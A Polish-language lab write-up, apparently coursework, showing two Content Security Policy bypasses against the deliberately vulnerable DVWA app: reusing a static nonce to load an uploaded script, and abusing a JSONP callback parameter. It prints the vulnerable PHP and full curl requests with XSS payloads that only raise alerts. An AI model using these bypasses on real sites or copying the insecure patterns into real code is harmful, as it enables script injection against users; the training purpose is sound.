# CSP - Content Security Policy Bypass
## Opis techniki
<blockquote> Content Security Policy (CSP) służy do definiowania, skąd można ładować lub wykonywać skrypty i inne zasoby. Content-Security-Policy to nazwa nagłówka odpowiedzi HTTP, którego przeglądarki używają do zwiększenia bezpieczeństwa dokumentu (lub strony internetowej). Nagłówek Content-Security-Policy pozwala ograniczyć, które zasoby (takie jak JavaScript, CSS, obrazy itp.) mogą być ładowane i z jakich adresów URL mogą być ładowane.

Chociaż jest on używany głównie jako nagłówek odpowiedzi HTTP, można go również zastosować za pomocą metatagu.

CSP został zaprojektowany w celu zmniejszenia powierzchni ataku ataków Cross Site Scripting (XSS), późniejsze wersje specyfikacji chronią również przed innymi formami ataków, takimi jak Click Jacking.
  
Opisane poniżej podatności nie dotyczą stricte CSP, a błędów w jej implementacji.
</blockquote>

## DVWA labs

- [DVWA SQLi #1 - Medium](#dvwa-csp-1---medium)

- [DVWA SQLi #2 - High](#dvwa-csp-2---high)

Powtórzenie podanych przykładów wymaga zmiany adresu IP oraz tokenu sesji.

<br/>

## DVWA CSP #1 - Medium
Cel: Uruchomienie pliku z kodem JavaScript.

Na poziomie średnim polityka CSP próbuje użyć nonce, aby zapobiec dodawaniu skryptów inline przez atakujących. Nonce jest stałe, więc można je odczytać ze źródła strony i wykorzystać w spreparowanym zapytaniu.

#### Kod źródłowy `PHP` 

```php

 <?php

$headerCSP = "Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';";

header($headerCSP);

// Disable XSS protections so that inline alert boxes will work
header ("X-XSS-Protection: 0");

# <script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script>

?>
<?php
if (isset ($_POST['include'])) {
$page[ 'body' ] .= "
    " . $_POST['include'] . "
";
}
$page[ 'body' ] .= '
<form name="csp" method="POST">
    <p>Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.</p>
    <input size="50" type="text" name="include" value="" id="include" />
    <input type="submit" value="Include" />
</form>
';

```
Plik 'new.js' jest wysyłany na serwer zgodnie z opisem podatności wysyłania plików (https://github.com/249064/CBE-BAW-2023/blob/main/file_upload.md). Zostaje umieszczony w ścieżce "../../hackable/uploads/new.js". Kod w pliku: [alert("sukces");].
Następnie wysyłane jest spreparowane zapytanie wykorzystujące XSS do uruchomienia podanego skryptu, wraz z nonce odczytanym ze źródła strony.

#### Komenda `curl` 

```bash
curl -i -s -k -X $'POST' \
    -H $'Host: 10.10.147.162' -H $'Content-Length: 140' -H $'Cache-Control: max-age=0' -H $'Upgrade-Insecure-Requests: 1' -H $'Origin: http://10.10.147.162' -H $'Content-Type: application/x-www-form-urlencoded' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H $'Referer: http://10.10.147.162/vulnerabilities/csp/' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: close' \
    -b $'PHPSESSID=0itseg0m3lh218vibq3kl391k2; security=medium' \
    --data-binary $'include=%3Cscript+nonce%3D%22TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA%3D%22+src%3D%22..%2F..%2Fhackable%2Fuploads%2Fnew.js%22%3E+%3C%2Fscript%3E+' \
    $'http://10.10.147.162/vulnerabilities/csp/'
```

#### Efekt działania skryptu:
![image](https://github.com/249064/CBE-BAW-2023/assets/133172137/1f49a2cb-a262-4a14-acbe-7407f4f3c8d9)

Kod z pliku został wykonany.
<br/>

<br/>
<br/>

## DVWA CSP #2 - High

Cel: Uruchomienie własnego kodu JavaScript

CSP ogranicza zakres skryptów które mogą zostać uruchomione poprzez określenie "script-src 'self'".

#### Kod źródłowy `PHP` 

```php
?php
$headerCSP = "Content-Security-Policy: script-src 'self';";

header($headerCSP);

?>
<?php
if (isset ($_POST['include'])) {
$page[ 'body' ] .= "
    " . $_POST['include'] . "
";
}
$page[ 'body' ] .= '
<form name="csp" method="POST">
    <p>The page makes a call to ' . DVWA_WEB_PAGE_TO_ROOT . '/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.</p>
    <p>1+2+3+4+5=<span id="answer"></span></p>
    <input type="button" id="solve" value="Solve the sum" />
</form>

<script src="source/high.js"></script>
';

```
Przejęte zostaje zapytanie i zmieniony zostaje parametr "callback".

#### Komenda `curl` 

```bash
curl -i -s -k -X $'GET' \
    -H $'Host: 10.10.147.162' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36' -H $'Accept: */*' -H $'Referer: http://10.10.147.162/vulnerabilities/csp/' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: close' \
    -b $'PHPSESSID=0itseg0m3lh218vibq3kl391k2; security=high' \
    $'http://10.10.147.162/vulnerabilities/csp/source/jsonp.php?callback=alert(\"sukces\")'
```

#### Efekt działania skryptu:
![image](https://github.com/249064/CBE-BAW-2023/assets/133172137/04aa4662-d8df-4acd-9812-6013c6a63c78)

Przekazany kod został uruchomiony mimo wykorzystania CSP.
<br/>
